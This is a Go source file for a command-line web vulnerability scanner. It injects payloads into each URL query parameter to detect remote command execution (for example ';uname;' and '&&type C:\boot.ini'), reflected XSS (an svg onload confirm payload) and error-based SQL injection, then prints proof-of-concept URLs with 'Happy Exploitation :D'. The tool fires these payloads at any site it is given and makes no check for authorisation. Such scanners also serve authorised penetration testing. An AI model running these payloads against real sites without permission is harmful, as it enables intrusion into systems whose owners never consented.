package main

import(
	"fmt"
	"flag"
	"bufio"
	"os"
	"strings"
	"net/http"
	"io/ioutil"
	"bytes"
	"regexp"
)

func main(){
	var urls []string
	flag.Parse()
	
	if flag.NArg() > 0 {
		urls = []string{flag.Arg(0)}
		
	} else {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			urls = append(urls, sc.Text())
		}

		if err := sc.Err(); err != nil {
			fmt.Fprintf(os.Stderr, " failed to read input: %s\n ", err)
		}
	}
	//fmt.Println(urls)
	for _, url := range urls {
		url = strings.TrimSpace(url)
		if (strings.Contains(url, "?")) {
			fmt.Printf("[!] Now Scanning %s\n", url)
			rce_func(url)
			xss_func(url)
			error_based_sqli_func(url)
		} else {
			fmt.Printf(" [Warning] %s is not a valid URL \n ",url )
			fmt.Println(" [Warning] You should write a Full URL .e.g http://site.com/page.php?id=value ")	
		}
	}
}

func httpGet(url string) ([]byte, error) {
	res, err := http.Get(url)
	if err != nil {
		return []byte{}, err
	}

	raw, err := ioutil.ReadAll(res.Body)

	res.Body.Close()
	if err != nil {
		return []byte{}, err
	}

	return raw, nil
}


func rce_func(url string) {
	fmt.Println(" [!] Now Scanning for Remote Code/Command Execution ")
	fmt.Println(" [!] Covering Linux & Windows Operating Systems ")
	fmt.Println(" [!] Please wait ....")
	payloads := []string {
		";${@print(md5(bugyellow))}", 
		";${@print(md5(\"bugyellow\"))}",
		";uname;","&&dir", "&&type C:\\boot.ini", ";phpinfo();", ";phpinfo",
	}
	check, _ := regexp.Compile("51107ed95250b4099a0f481221d56497|Linux|eval\\(\\)|SERVER_ADDR|Volume.+Serial|\\[boot")
	main_function(url, payloads, check)
}

func xss_func(url string) error{
	fmt.Println(" [!] Now Scanning for XSS ")
	fmt.Println(" [!] Please wait .... ")
	payloads := []string {
		//"%3e%3c%27%22",
		//"%253e%253c%2527%2522",
		"%27%3Ebugyellow%3Csvg%2Fonload%3Dconfirm%28%2Fbugyellow%2F%29%3Eweb",
		"%78%22%78%3e%78",
		"%22%3Ebugyellow%3Csvg%2Fonload%3Dconfirm%28%2Fbugyellow%2F%29%3Eweb",
		"bugyellow%3Csvg%2Fonload%3Dconfirm%28%2Fbugyellow%2F%29%3Eweb",
	}
	check, _ := regexp.Compile("bugyellow<svg|x>x")
	main_function(url, payloads, check)
	return nil
}

func error_based_sqli_func(url string) {
	fmt.Println(" [!] Now Scanning for Error Based SQL Injection ")
	fmt.Println(" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
	fmt.Println(" [!] Please wait .... ")
	payloads := []string{
		"3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
	}
	check,_ := regexp.Compile(" Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error ")
	main_function(url, payloads, check)
}

func main_function(url string,payloads []string,check *regexp.Regexp) error {
	//fmt.Println(payloads)
	vuln := 0
	for _, params := range strings.Split(strings.SplitN(url,"?",2)[1], "&"){
		for _, payload := range payloads{
			bugs := strings.Replace(url, params,params+payload, -1) 
			raw, err := httpGet(bugs)
			if err != nil {
				return err
			}
			sc := bufio.NewScanner(bytes.NewReader(raw))
			for sc.Scan() {
				if check.MatchString(sc.Text()){
					fmt.Println(" [*] Payload Found . . . ")
					fmt.Println(" [*] Payload: " + payload)
					fmt.Println(" [!] Code Snippet: " + sc.Text())
					fmt.Println(" [*] POC: "+bugs)
					fmt.Println(" [*] Happy Exploitation :D ")

					vuln += 1
				}
			}
		}
	}
	if vuln == 0{
		fmt.Println(" [!] Target is not vulnerable! ")
	} else {
		fmt.Printf(" [!] Congratulations you've found %d bugs:-) \n ", vuln)
	}
	return nil
}
